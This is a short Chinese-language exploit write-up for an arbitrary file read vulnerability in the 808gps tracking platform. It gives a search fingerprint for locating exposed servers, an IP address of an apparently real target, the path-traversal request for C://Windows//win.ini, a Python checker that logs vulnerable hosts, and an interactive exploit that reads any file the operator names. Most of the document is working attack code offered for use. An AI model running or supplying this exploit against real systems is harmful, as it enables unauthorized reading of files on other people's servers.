## 一、资产搜索

```
body="./open/webApi.html"||body="/808gps/"
```

## 二、网站测试

```
http://95.46.1.27
```

## 三、验证漏洞

```
/808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini
```

![image-20240908201752290](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908201752290.png)

## 四、POC

```
def poc(target):
    payload = "/808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "fonts" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    print(f"该网站[+]{target}存在任意文件读取漏洞")
                    return True
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print("连接超时，请重试")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def exp(target):
    payload = "/808gps/logger/downloadLogger.action?fileName=C:"
    while True:
        cmd = input("请输入要查看的文件，当前目录C盘,从//开始(q退出)\n>>>>>>>>>>>>>>")
        if cmd == 'q':
            exit()
        res1 = requests.get(url=target, verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(target + payload + cmd, verify=False,timeout=5)
            if res2.text == '':
                print("该文件不存在，请重新输入！！")
            else:
                print(res2.text)
```

## 六、测试结果

![image-20240908201837664](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908201837664.png)

![image-20240908202149791](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908202149791.png)

